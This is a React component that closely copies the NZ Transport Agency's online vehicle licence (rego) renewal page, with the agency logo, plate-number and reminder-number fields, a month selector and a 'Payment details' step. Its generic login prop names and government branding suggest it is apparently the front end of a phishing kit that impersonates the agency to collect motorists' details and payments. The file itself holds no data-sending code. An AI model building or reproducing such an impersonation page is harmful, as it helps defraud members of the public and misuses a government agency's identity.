import React, { useState } from 'react';
import './LoginScreen.css';
import nztaLogo from '../assets/nzta-logo.png';

function LoginScreen({ loginName, errors, isLoading, onInputChange, onLogin }) {
  const [showError, setShowError] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [reminderNumber, setReminderNumber] = useState('');
  const [selectedMonths, setSelectedMonths] = useState(null);
  const [useSpecificDate, setUseSpecificDate] = useState(false);
  const [expiryDate, setExpiryDate] = useState('');

  const handleContinueClick = () => {
    if (!loginName || loginName.trim() === '') {
      setShowError(true);
      setErrorMsg('Please enter your plate number');
      return;
    }
    if (loginName.trim().length < 2) {
      setShowError(true);
      setErrorMsg('Please enter a valid plate number');
      return;
    }
    if (!useSpecificDate && !selectedMonths) {
      setShowError(true);
      setErrorMsg('Please select how long you want to license your vehicle for');
      return;
    }
    if (useSpecificDate && !expiryDate) {
      setShowError(true);
      setErrorMsg('Please select a specific expiry date');
      return;
    }
    setShowError(false);
    onLogin();
  };

  const handleCancel = () => {
    setShowError(false);
    setErrorMsg('');
  };

  return (
    <div className="nzta-renewal">
      {/* ─── Header ─── */}
      <header className="nzta-header">
        <div className="nzta-header-inner">
          <div className="nzta-logo">
            <img
              src={nztaLogo}
              alt="NZ Transport Agency"
              className="nzta-logo-img"
            />
          </div>
          <div className="nzta-services-tab">
            
            <span>Online Services</span>
          </div>
        </div>
      </header>

      {/* ─── Main ─── */}
      <main className="nzta-main">
        <a
          href="#back"
          className="nzta-back"
          onClick={(e) => {
            e.preventDefault();
            handleCancel();
          }}
        >
          ← Back
        </a>

        <h1 className="nzta-title">Renew your vehicle licence (rego)</h1>

        {/* Steps — 3 steps, step 1 active */}
        <ol className="nzta-steps">
          <li className="nzta-step active">
            <span className="nzta-step-circle">1</span>
            <span className="nzta-step-label">Enter vehicle details</span>
          </li>
          <li className="nzta-step">
            <span className="nzta-step-circle">2</span>
            <span className="nzta-step-label">Payment details</span>
          </li>
          <li className="nzta-step">
            <span className="nzta-step-circle">3</span>
            <span className="nzta-step-label">Confirmation</span>
          </li>
        </ol>

        <hr className="nzta-divider" />

        <p className="nzta-hint">
          All fields are required unless marked 'optional'.
        </p>

        <h2 className="nzta-subtitle">Enter your vehicle details</h2>

        {/* Plate number */}
        <div className="nzta-field">
          <label>Plate number</label>
          <input
            type="text"
            value={loginName}
            onChange={(e) => {
              onInputChange('loginName', e.target.value.toUpperCase());
              setShowError(false);
            }}
            className={`nzta-input ${showError && !loginName ? 'input-error-red' : ''}`}
            maxLength={8}
          />
          <span className="nzta-help">Example: ABC123</span>
        </div>

        {/* Reminder number */}
        <div className="nzta-field">
          <label>Reminder number (optional)</label>
          <input
            type="text"
            value={reminderNumber}
            onChange={(e) =>
              setReminderNumber(e.target.value.replace(/\D/g, '').slice(0, 8))
            }
            className="nzta-input"
            maxLength={8}
          />
          <span className="nzta-help">
            This is the 8-digit number (including leading zeros) on the top right
            hand corner of your renewal notice. Entering this will show you what
            address we'll send the label to.
          </span>
        </div>

        {/* Month selection */}
        <div className="nzta-field">
          <label>Select how long you want to license your vehicle for</label>
          <div className="nzta-months-grid">
            {Array.from({ length: 12 }, (_, i) => i + 1).map((m) => (
              <button
                key={m}
                type="button"
                className={`nzta-month-btn ${
                  selectedMonths === m && !useSpecificDate ? 'selected' : ''
                }`}
                onClick={() => {
                  setSelectedMonths(m);
                  setUseSpecificDate(false);
                  setShowError(false);
                }}
              >
                <span className="nzta-month-num">{m}</span>
                <span className="nzta-month-lbl">
                  {m === 1 ? 'month' : 'months'}
                </span>
              </button>
            ))}
          </div>
        </div>

        {/* Specific expiry date */}
        <div className="nzta-checkbox-row">
          <input
            type="checkbox"
            id="specific-date"
            checked={useSpecificDate}
            onChange={(e) => {
              setUseSpecificDate(e.target.checked);
              if (e.target.checked) setSelectedMonths(null);
            }}
          />
          <label htmlFor="specific-date">
            Or select a specific expiry date
          </label>
        </div>

        {useSpecificDate && (
          <div className="nzta-field">
            <input
              type="date"
              value={expiryDate}
              onChange={(e) => setExpiryDate(e.target.value)}
              className="nzta-input"
            />
          </div>
        )}

        {/* Total amount card */}
        <div className="nzta-total-card">
          <h3>Total amount</h3>
          <div className="nzta-total-row">
            <span>Licence fee</span>
            <span>$0.00</span>
          </div>
          <div className="nzta-total-row">
            <span>Administration fee</span>
            <span>$0.00</span>
          </div>
          <div className="nzta-total-row nzta-total-final">
            <span>Total cost (incl GST)</span>
            <span>$0.00</span>
          </div>
        </div>

        {/* Error */}
        {showError && <div className="nzta-error-banner">⚠️ {errorMsg}</div>}

        {/* Actions */}
        <div className="nzta-actions">
          <button
            type="button"
            className="nzta-btn nzta-btn-continue"
            onClick={handleContinueClick}
            disabled={isLoading}
          >
            {isLoading ? 'Please wait…' : 'Continue'}
          </button>
          <button
            type="button"
            className="nzta-btn nzta-btn-cancel"
            onClick={handleCancel}
            disabled={isLoading}
          >
            Cancel
          </button>
        </div>
      </main>
    </div>
  );
}

export default LoginScreen;